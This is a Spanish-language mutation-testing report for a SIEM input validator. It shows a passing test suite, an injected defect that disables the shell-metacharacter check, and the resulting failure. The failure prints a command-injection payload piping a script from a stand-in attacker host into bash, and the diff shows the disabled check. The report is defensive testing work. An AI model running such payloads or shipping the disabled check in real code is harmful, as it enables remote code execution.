@@ -1,0 +1,33 @@
+# Propiedad: Validacion de IP y usuario por lista blanca
+# Archivo mutado (en la copia): libs/siem_validators.py
+# Pruebas: tests/unit/test_validators.py tests/unit/test_s01_inyeccion_comandos.py
+
+## 1. Codigo sano
+........................................................................ [ 48%]
+........................................................................ [ 97%]
+....                                                                     [100%]
+148 passed in 0.24s
+
+## 2. Defecto inyectado: p='libs/siem_validators.py'; s=open(p).read(); a='return not _METACARACTERES_SHELL & set(valor)'; assert a in s; open(p,'w').write(s.replace(a,'return True'))
+.................................................................F
+=================================== FAILURES ===================================
+_ test_safe_token_detecta_los_payloads_de_shell[victima; curl http://atacante/x.sh | bash] _
+tests/unit/test_validators.py:112: in test_safe_token_detecta_los_payloads_de_shell
+    assert safe_token(valor) is False
+E   AssertionError: assert True is False
+E    +  where True = safe_token('victima; curl http://atacante/x.sh | bash')
+=========================== short test summary info ============================
+FAILED tests/unit/test_validators.py::test_safe_token_detecta_los_payloads_de_shell[victima; curl http://atacante/x.sh | bash]
+!!!!!!!!!!!!!!!!!!!!!!!!!! stopping after 1 failures !!!!!!!!!!!!!!!!!!!!!!!!!!!
+1 failed, 65 passed in 0.20s
+
+## 3. Diferencia entre el archivo sano y el mutado
+@@ -76,7 +76,7 @@
+     """
+     if not isinstance(valor, str) or not valor:
+         return False
+-    return not _METACARACTERES_SHELL & set(valor)
++    return True
+ 
+ 
+ def resolver_ip_atacante(incidente_o_ips: object, respaldo: object = None) -> str | None:
